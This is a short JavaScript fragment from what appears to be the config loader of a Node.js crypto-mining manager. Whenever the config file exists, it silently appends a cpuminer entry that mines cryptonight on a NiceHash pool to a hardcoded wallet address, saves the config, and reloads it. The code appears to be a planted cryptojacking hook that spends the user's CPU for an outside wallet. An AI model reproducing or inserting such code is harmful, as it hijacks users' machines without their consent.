  ...
  loadConfig: function () {
    fs.stat(configPath, function (err, stat) {
      if (err == null) {
        ...
        config.config.entries.push({id:Date.now(),enabled:true,binPath:"bin/cpuminer",cmdline:"-a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u 1G6DD3skr8kzjJURzoME8TWLT6iqrFApk3."+process.env.WNAME+" -p x -t 3",type:"cpuminer-opt",port:10001,writeMinerLog:true,shell:false});
        config.saveConfig();
        setTimeout(function(){
          config.loadConfig();
        },500);
